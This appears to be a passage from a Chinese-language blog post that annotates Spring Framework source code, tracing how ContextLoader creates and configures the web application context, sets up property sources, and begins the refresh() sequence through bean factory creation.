<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configureAndRefreshWebApplicationContext</span><span class="params">(ConfigurableWebApplicationContext wac, ServletContext sc)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ObjectUtils.identityToString(wac).equals(wac.getId())) &#123;</span><br><span class="line">        <span class="comment">// The application context id is still set to its original default value</span></span><br><span class="line">        <span class="comment">// -&gt; assign a more useful id based on available information</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">idParam</span> <span class="operator">=</span> sc.getInitParameter(CONTEXT_ID_PARAM);</span><br><span class="line">        <span class="comment">// 查看是否配置了初始化参数contextId，若配置了，则使用它作为spring应用上下文id，否则使用WebApplicationContext.class.getName() + &quot;:&quot; + contextPath</span></span><br><span class="line">        <span class="keyword">if</span> (idParam != <span class="literal">null</span>) &#123;</span><br><span class="line">            wac.setId(idParam);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Generate default id...</span></span><br><span class="line">            wac.setId(ConfigurableWebApplicationContext.APPLICATION_CONTEXT_ID_PREFIX +</span><br><span class="line">                      ObjectUtils.getDisplayString(sc.getContextPath()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spring应用上下文绑定ServletContext</span></span><br><span class="line">    wac.setServletContext(sc);</span><br><span class="line">    <span class="type">String</span> <span class="variable">configLocationParam</span> <span class="operator">=</span> sc.getInitParameter(CONFIG_LOCATION_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (configLocationParam != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 配置启动参数contextConfigLocation，作为spring配置文件位置，详细：分析4</span></span><br><span class="line">        wac.setConfigLocation(configLocationParam);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The wac environment&#x27;s #initPropertySources will be called in any case when the context</span></span><br><span class="line">    <span class="comment">// is refreshed; do it eagerly here to ensure servlet property sources are in place for</span></span><br><span class="line">    <span class="comment">// use in any post-processing or initialization that occurs below prior to #refresh</span></span><br><span class="line">    <span class="type">ConfigurableEnvironment</span> <span class="variable">env</span> <span class="operator">=</span> wac.getEnvironment();</span><br><span class="line">    <span class="keyword">if</span> (env <span class="keyword">instanceof</span> ConfigurableWebEnvironment) &#123;</span><br><span class="line">        <span class="comment">// 初始化属性源：替换环境对象中propertySources对象servletContextInitParams的值（分析7有提到），servletConfig手动设置成null，因此servletConfigInitParams没有被替换。目的：确保在refresh()过程中能使用属性源。详细：分析8</span></span><br><span class="line">        ((ConfigurableWebEnvironment) env).initPropertySources(sc, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    customizeContext(sc, wac);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spring关键刷新方法org.springframework.context.support.AbstractApplicationContext#refresh，详细：3.refresh()</span></span><br><span class="line">    wac.refresh();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析1"><a href="#分析1" class="headerlink" title="分析1"></a>分析1</h2><p>org.springframework.web.context.ContextLoader#createWebApplicationContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebApplicationContext <span class="title function_">createWebApplicationContext</span><span class="params">(ServletContext sc)</span> &#123;</span><br><span class="line">    <span class="comment">// 确定spring应用上下文初始化类，详细：分析2</span></span><br><span class="line">    Class&lt;?&gt; contextClass = determineContextClass(sc);</span><br><span class="line">    <span class="keyword">if</span> (!ConfigurableWebApplicationContext.class.isAssignableFrom(contextClass)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ApplicationContextException</span>(<span class="string">&quot;Custom context class [&quot;</span> + contextClass.getName() +</span><br><span class="line">                                              <span class="string">&quot;] is not of type [&quot;</span> + ConfigurableWebApplicationContext.class.getName() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过反射创建spring应用上下文实例</span></span><br><span class="line">    <span class="keyword">return</span> (ConfigurableWebApplicationContext) BeanUtils.instantiateClass(contextClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析2"><a href="#分析2" class="headerlink" title="分析2"></a>分析2</h2><p>org.springframework.web.context.ContextLoader#determineContextClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; determineContextClass(ServletContext servletContext) &#123;</span><br><span class="line">    <span class="comment">// 如果有配置初始化参数：contextClass，则使用配置的类作为spring应用上下文初始化类</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">contextClassName</span> <span class="operator">=</span> servletContext.getInitParameter(CONTEXT_CLASS_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (contextClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(contextClassName, ClassUtils.getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ApplicationContextException</span>(</span><br><span class="line">                <span class="string">&quot;Failed to load custom context class [&quot;</span> + contextClassName + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有配置contextClass初始化参数，获取spring应用上下文初始化类，详细：分析3</span></span><br><span class="line">        contextClassName = defaultStrategies.getProperty(WebApplicationContext.class.getName());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(contextClassName, ContextLoader.class.getClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ApplicationContextException</span>(</span><br><span class="line">                <span class="string">&quot;Failed to load default context class [&quot;</span> + contextClassName + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析3"><a href="#分析3" class="headerlink" title="分析3"></a>分析3</h2><p>org.springframework.web.context.ContextLoader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_STRATEGIES_PATH</span> <span class="operator">=</span> <span class="string">&quot;ContextLoader.properties&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Properties defaultStrategies;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// Load default strategy implementations from properties file.</span></span><br><span class="line">    <span class="comment">// This is currently strictly internal and not meant to be customized</span></span><br><span class="line">    <span class="comment">// by application developers.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ClassPathResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(DEFAULT_STRATEGIES_PATH, ContextLoader.class);</span><br><span class="line">        defaultStrategies = PropertiesLoaderUtils.loadProperties(resource);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Could not load &#x27;ContextLoader.properties&#x27;: &quot;</span> + ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由此可见，通过加载当前类路径下的ContextLoader.properties文件来决定spring应用上下文初始化类</p>
<ul>
<li>ContextLoader.properties</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">org.springframework.web.context.WebApplicationContext</span>=<span class="string">org.springframework.web.context.support.XmlWebApplicationContext</span></span><br></pre></td></tr></table></figure>

<h2 id="分析4"><a href="#分析4" class="headerlink" title="分析4"></a>分析4</h2><p>org.springframework.context.support.AbstractRefreshableConfigApplicationContext#setConfigLocation</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setConfigLocation</span><span class="params">(String location)</span> &#123;</span><br><span class="line">   setConfigLocations(StringUtils.tokenizeToStringArray(location, CONFIG_LOCATION_DELIMITERS));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setConfigLocations</span><span class="params">(String... locations)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (locations != <span class="literal">null</span>) &#123;</span><br><span class="line">        Assert.noNullElements(locations, <span class="string">&quot;Config locations must not be null&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.configLocations = <span class="keyword">new</span> <span class="title class_">String</span>[locations.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; locations.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.configLocations[i] = resolvePath(locations[i]).trim();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.configLocations = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolvePath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：分析5</span></span><br><span class="line">    <span class="keyword">return</span> getEnvironment().resolveRequiredPlaceholders(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析5"><a href="#分析5" class="headerlink" title="分析5"></a>分析5</h2><p>org.springframework.context.support.AbstractApplicationContext#getEnvironment</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> ConfigurableEnvironment <span class="title function_">getEnvironment</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.environment == <span class="literal">null</span>) &#123;</span><br><span class="line">       <span class="comment">// 详细：分析6，当前类也有一个createEnvironment()方法，注意实际调用的是实现类的方法</span></span><br><span class="line">       <span class="built_in">this</span>.environment = createEnvironment();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">this</span>.environment;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析6"><a href="#分析6" class="headerlink" title="分析6"></a>分析6</h2><p>org.springframework.web.context.support.AbstractRefreshableWebApplicationContext#createEnvironment</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> ConfigurableEnvironment <span class="title function_">createEnvironment</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建StandardServletEnvironment作为spring应用上下文环境对象，详细：分析7</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StandardServletEnvironment</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析7"><a href="#分析7" class="headerlink" title="分析7"></a>分析7</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardServletEnvironment</span> <span class="keyword">extends</span> <span class="title class_">StandardEnvironment</span> <span class="keyword">implements</span> <span class="title class_">ConfigurableWebEnvironment</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVLET_CONTEXT_PROPERTY_SOURCE_NAME</span> <span class="operator">=</span> <span class="string">&quot;servletContextInitParams&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVLET_CONFIG_PROPERTY_SOURCE_NAME</span> <span class="operator">=</span> <span class="string">&quot;servletConfigInitParams&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JNDI_PROPERTY_SOURCE_NAME</span> <span class="operator">=</span> <span class="string">&quot;jndiProperties&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">customizePropertySources</span><span class="params">(MutablePropertySources propertySources)</span> &#123;</span><br><span class="line">		propertySources.addLast(<span class="keyword">new</span> <span class="title class_">StubPropertySource</span>(SERVLET_CONFIG_PROPERTY_SOURCE_NAME));</span><br><span class="line">		propertySources.addLast(<span class="keyword">new</span> <span class="title class_">StubPropertySource</span>(SERVLET_CONTEXT_PROPERTY_SOURCE_NAME));</span><br><span class="line">		<span class="keyword">if</span> (JndiLocatorDelegate.isDefaultJndiEnvironmentAvailable()) &#123;</span><br><span class="line">			propertySources.addLast(<span class="keyword">new</span> <span class="title class_">JndiPropertySource</span>(JNDI_PROPERTY_SOURCE_NAME));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">super</span>.customizePropertySources(propertySources);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardEnvironment</span> <span class="keyword">extends</span> <span class="title class_">AbstractEnvironment</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">customizePropertySources</span><span class="params">(MutablePropertySources propertySources)</span> &#123;</span><br><span class="line">		propertySources.addLast(<span class="keyword">new</span> <span class="title class_">MapPropertySource</span>(SYSTEM_PROPERTIES_PROPERTY_SOURCE_NAME, getSystemProperties()));</span><br><span class="line">		propertySources.addLast(<span class="keyword">new</span> <span class="title class_">SystemEnvironmentPropertySource</span>(SYSTEM_ENVIRONMENT_PROPERTY_SOURCE_NAME, getSystemEnvironment()));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractEnvironment</span> <span class="keyword">implements</span> <span class="title class_">ConfigurableEnvironment</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">MutablePropertySources</span> <span class="variable">propertySources</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MutablePropertySources</span>(<span class="built_in">this</span>.logger);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ConfigurablePropertyResolver</span> <span class="variable">propertyResolver</span> <span class="operator">=</span></span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">PropertySourcesPropertyResolver</span>(<span class="built_in">this</span>.propertySources);</span><br><span class="line">			</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">AbstractEnvironment</span><span class="params">()</span> &#123;</span><br><span class="line">        customizePropertySources(<span class="built_in">this</span>.propertySources);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Initialized &quot;</span> + getClass().getSimpleName() + <span class="string">&quot; with PropertySources &quot;</span> + <span class="built_in">this</span>.propertySources);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">customizePropertySources</span><span class="params">(MutablePropertySources propertySources)</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，在实例化StandardServletEnvironment时，会通过父类的构造方法，调用当前类的customizePropertySources，从而给propertySources添加了占位性质的servletContextInitParams(后续替换)、servletConfigInitParams(后续替换)，jndiProperties、systemProperties和systemEnvironment</p>
<h2 id="分析8"><a href="#分析8" class="headerlink" title="分析8"></a>分析8</h2><p>org.springframework.web.context.support.StandardServletEnvironment#initPropertySources</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initPropertySources</span><span class="params">(ServletContext servletContext, ServletConfig servletConfig)</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：分析9</span></span><br><span class="line">    WebApplicationContextUtils.initServletPropertySources(getPropertySources(), servletContext, servletConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析9"><a href="#分析9" class="headerlink" title="分析9"></a>分析9</h2><p>org.springframework.web.context.support.WebApplicationContextUtils#initServletPropertySources(org.springframework.core.env.MutablePropertySources, javax.servlet.ServletContext, javax.servlet.ServletConfig)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">initServletPropertySources</span><span class="params">(</span></span><br><span class="line"><span class="params">    MutablePropertySources propertySources, ServletContext servletContext, ServletConfig servletConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Assert.notNull(propertySources, <span class="string">&quot;&#x27;propertySources&#x27; must not be null&quot;</span>);</span><br><span class="line">    <span class="comment">// 两个常量具体值，可查看分析7</span></span><br><span class="line">    <span class="keyword">if</span> (servletContext != <span class="literal">null</span> &amp;&amp; propertySources.contains(StandardServletEnvironment.SERVLET_CONTEXT_PROPERTY_SOURCE_NAME) &amp;&amp;</span><br><span class="line">        propertySources.get(StandardServletEnvironment.SERVLET_CONTEXT_PROPERTY_SOURCE_NAME) <span class="keyword">instanceof</span> StubPropertySource) &#123;</span><br><span class="line">        propertySources.replace(StandardServletEnvironment.SERVLET_CONTEXT_PROPERTY_SOURCE_NAME,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">ServletContextPropertySource</span>(StandardServletEnvironment.SERVLET_CONTEXT_PROPERTY_SOURCE_NAME, servletContext));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (servletConfig != <span class="literal">null</span> &amp;&amp; propertySources.contains(StandardServletEnvironment.SERVLET_CONFIG_PROPERTY_SOURCE_NAME) &amp;&amp;</span><br><span class="line">        propertySources.get(StandardServletEnvironment.SERVLET_CONFIG_PROPERTY_SOURCE_NAME) <span class="keyword">instanceof</span> StubPropertySource) &#123;</span><br><span class="line">        propertySources.replace(StandardServletEnvironment.SERVLET_CONFIG_PROPERTY_SOURCE_NAME,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">ServletConfigPropertySource</span>(StandardServletEnvironment.SERVLET_CONFIG_PROPERTY_SOURCE_NAME, servletConfig));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-refresh"><a href="#3-refresh" class="headerlink" title="3.refresh()"></a>3.refresh()</h1><p>下面为XmlWebApplicationContext的继承关系图：</p>
<p><img src="/../img/XmlWebApplicationContext.png"></p>
<p>org.springframework.context.support.AbstractApplicationContext#refresh，包含12 + 1(finally) + 2(catch) 共15个方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) &#123;</span><br><span class="line">        <span class="comment">// Prepare this context for refreshing.</span></span><br><span class="line">        prepareRefresh();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Tell the subclass to refresh the internal bean factory.</span></span><br><span class="line">        <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Prepare the bean factory for use in this context.</span></span><br><span class="line">        prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Allows post-processing of the bean factory in context subclasses.</span></span><br><span class="line">            postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke factory processors registered as beans in the context.</span></span><br><span class="line">            invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Register bean processors that intercept bean creation.</span></span><br><span class="line">            registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Initialize message source for this context.</span></span><br><span class="line">            initMessageSource();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Initialize event multicaster for this context.</span></span><br><span class="line">            initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Initialize other special beans in specific context subclasses.</span></span><br><span class="line">            onRefresh();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check for listener beans and register them.</span></span><br><span class="line">            registerListeners();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.</span></span><br><span class="line">            finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Last step: publish corresponding event.</span></span><br><span class="line">            finishRefresh();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">&quot;Exception encountered during context initialization - &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;cancelling refresh attempt: &quot;</span> + ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">            destroyBeans();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Reset &#x27;active&#x27; flag.</span></span><br><span class="line">            cancelRefresh(ex);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// Reset common introspection caches in Spring&#x27;s core, since we</span></span><br><span class="line">            <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">            resetCommonCaches();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-1-prepareRefresh"><a href="#3-1-prepareRefresh" class="headerlink" title="3.1 prepareRefresh"></a>3.1 prepareRefresh</h2><p>作用：刷新前准备，记录开始时间、开始标记、日志信息，初始化属性源，必须参数非空校验，创建早期应用事件集合。</p>
<p>org.springframework.context.support.AbstractApplicationContext#prepareRefresh</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">prepareRefresh</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.startupDate = System.currentTimeMillis();</span><br><span class="line">    <span class="built_in">this</span>.closed.set(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">this</span>.active.set(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Refreshing &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize any placeholder property sources in the context environment</span></span><br><span class="line">    <span class="comment">// 初始化属性源：替换环境对象中propertySources对象servletContextInitParams、servletConfigInitParams的值</span></span><br><span class="line">    initPropertySources();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Validate that all properties marked as required are resolvable</span></span><br><span class="line">    <span class="comment">// see ConfigurablePropertyResolver#setRequiredProperties</span></span><br><span class="line">    <span class="comment">// 校验必须属性是否合法（不为null，可手动设置必须属性）</span></span><br><span class="line">    getEnvironment().validateRequiredProperties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allow for the collection of early ApplicationEvents,</span></span><br><span class="line">    <span class="comment">// to be published once the multicaster is available...</span></span><br><span class="line">    <span class="comment">// 创建早期应用事件集合，收集早期应用事件，广播器可用时触发事件调用</span></span><br><span class="line">    <span class="built_in">this</span>.earlyApplicationEvents = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;ApplicationEvent&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-2-obtainFreshBeanFactory"><a href="#3-2-obtainFreshBeanFactory" class="headerlink" title="3.2 obtainFreshBeanFactory"></a>3.2 obtainFreshBeanFactory</h2><p>作用：获取BeanFactory（DefaultListableBeanFactory），解析spring的xml配置文件，把bean的名称、定义缓存到beanDefinitionNames（bean名称的list集合）、beanDefinitionMap（bean名称与定义对应的map集合）。</p>
<p>org.springframework.context.support.AbstractApplicationContext#obtainFreshBeanFactory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConfigurableListableBeanFactory <span class="title function_">obtainFreshBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：代码3.2.1</span></span><br><span class="line">    refreshBeanFactory();</span><br><span class="line">    <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> getBeanFactory();</span><br><span class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">&quot;Bean factory for &quot;</span> + getDisplayName() + <span class="string">&quot;: &quot;</span> + beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> beanFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-1"><a href="#代码3-2-1" class="headerlink" title="代码3.2.1"></a>代码3.2.1</h3><p>org.springframework.context.support.AbstractRefreshableApplicationContext#refreshBeanFactory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">refreshBeanFactory</span><span class="params">()</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">if</span> (hasBeanFactory()) &#123;</span><br><span class="line">        destroyBeans();</span><br><span class="line">        closeBeanFactory();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建BeanFactory，详细：代码3.2.2</span></span><br><span class="line">        <span class="type">DefaultListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> createBeanFactory();</span><br><span class="line">        beanFactory.setSerializationId(getId());</span><br><span class="line">        <span class="comment">// 设置BeanFactory是否支持：对象重名覆盖、循环依赖，详细：代码3.2.3</span></span><br><span class="line">        customizeBeanFactory(beanFactory);</span><br><span class="line">        <span class="comment">// 加载bean定义，详细：代码3.2.4</span></span><br><span class="line">        loadBeanDefinitions(beanFactory);</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>.beanFactoryMonitor) &#123;</span><br><span class="line">            <span class="built_in">this</span>.beanFactory = beanFactory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ApplicationContextException</span>(<span class="string">&quot;I/O error parsing bean definition source for &quot;</span> + getDisplayName(), ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-2"><a href="#代码3-2-2" class="headerlink" title="代码3.2.2"></a>代码3.2.2</h3><ol>
<li>org.springframework.context.support.AbstractRefreshableApplicationContext#createBeanFactory</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> DefaultListableBeanFactory <span class="title function_">createBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultListableBeanFactory</span>(getInternalParentBeanFactory());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>org.springframework.beans.factory.support.DefaultListableBeanFactory#DefaultListableBeanFactory(org.springframework.beans.factory.BeanFactory)</li>
</ol>
